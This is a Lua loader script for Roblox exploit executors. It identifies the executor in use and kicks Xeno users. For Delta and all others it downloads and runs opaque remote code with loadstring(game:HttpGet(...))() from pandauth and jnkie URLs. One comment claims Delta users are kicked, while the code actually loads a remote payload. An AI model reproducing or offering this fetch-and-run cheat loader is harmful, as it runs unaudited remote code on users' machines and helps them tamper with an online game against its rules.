-- ==========================================

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Function to identify the current executor name
local function getExecutor()
    -- Check custom Xeno globals (from XenoExecutor source)
    if Xeno ~= nil or getgenv().Xeno ~= nil then
        return "Xeno"
    end
    
    -- Check custom Delta globals
    if DELTA_LOADED ~= nil or getgenv().DELTA_LOADED ~= nil then
        return "Delta"
    end

    -- Check via standard identifyexecutor()
    if identifyexecutor then
        local name = identifyexecutor()
        if type(name) == "string" then
            return name
        end
    end

    -- Check via getexecutorname()
    if getexecutorname then
        local name = getexecutorname()
        if type(name) == "string" then
            return name
        end
    end

    return "Unknown"
end

-- ==========================================
--  EXECUTION & KICK LOGIC
-- ==========================================

local currentExecutor = getExecutor():lower()

-- Scenario 1: Kick if using Delta
if currentExecutor:find("delta") then
    loadstring(game:HttpGet("https://vss.pandauth.com/kv/fe63c15f40ddcfe2"))()

-- Scenario 2: Kick if using Xeno Executor
elseif currentExecutor:find("xeno") then
    LocalPlayer:Kick("\n[Security Alert]\nXeno Executor is not allowed for now. Join Discord for more information: https://discord.gg/weDZp9vVFh")

-- Scenario 3: Allowed Executor / Default Execution
else
    loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/eb70e01a85a92c98ca0e54a9bb5a2474cef55eef9f2d0aa76aa086e6217f7453/download"))()
end
